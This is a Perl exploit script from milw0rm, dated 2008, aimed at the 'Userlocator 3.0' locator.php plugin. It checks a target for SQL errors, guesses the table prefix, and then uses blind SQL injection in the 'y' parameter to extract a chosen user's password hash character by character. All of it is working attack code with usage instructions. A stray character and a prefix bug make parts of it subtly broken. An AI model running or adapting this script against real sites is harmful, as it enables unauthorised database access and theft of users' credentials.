#!/usr/bin/perl -w

use strict;
use LWP::Simple;

$| = 1;
p
print q {

:::::::::::::::::::::::::::::
:: Userlocator 3.0 Exploit ::
::  written by katharsis   ::
:::::::::::::::::::::::::::::

[~] www.katharsis.x2.to
[~] nebelfrost23@web.de

};

if (@ARGV < 2) {
 print "Usage: usrlocsploit.pl [url] [user id]\nExample: usrlocsploit.pl www.target.com 1\n";
 exit;
}

my $page = shift;
my $uid  = shift;

my $prefix;

my @charset = ('a','b','c','d','e','f','1','2','3','4','5','6','7','8','9','0');

print "[x] Vulnerability check...\n";

my $chreq = get("http://".$page."/locator.php?action=get_user&y='");

if (($chreq =~ m/Database error/i) || ($chreq =~ m/Invalid SQL/i)) { 

print "[x] Seems to be vulnerable!\n";

} else {

print "[o] Seems to be patched, sorry\n";
exit;

}

print "[^] Prefix check...\n";

if ($chreq =~ m/(..._)wlw/i) {

 print "[^] Success, using Prefix '$1'\n";
 $prefix = $1;

} else { 
 print "[o] Can't find prefix, using 'bb1_'\n";
 $prefix = "bb1";
}

print "[+] Getting hash...\n";
print "[+] Hash: ";

my $curnum = 1;

while($curnum < 32) {

my $false_result = get("http://".$page."/locator.php?action=get_user&x=233&y=365'/**/OR/**/ascii(substring((SELECT+password+FROM+".$prefix."users+WHERE+userid=".$uid."),".$curnum."))=-1/*");

foreach(@charset) {

 my $ascode       = ord($_);
 my $result       = get("http://".$page."/locator.php?action=get_user&x=233&y=365'/**/OR/**/ascii(substring((SELECT+password+FROM+".$prefix."users+WHERE+userid=".$uid."),".$curnum."))=".$ascode."/*");

 if (length($result) != 0) {
  if (length($result) != length($false_result)) {
   print chr($ascode);
   $curnum++;
   }
  }
 }
}

print "\n[+] Done!\n";

# EOF

# milw0rm.com [2008-12-21]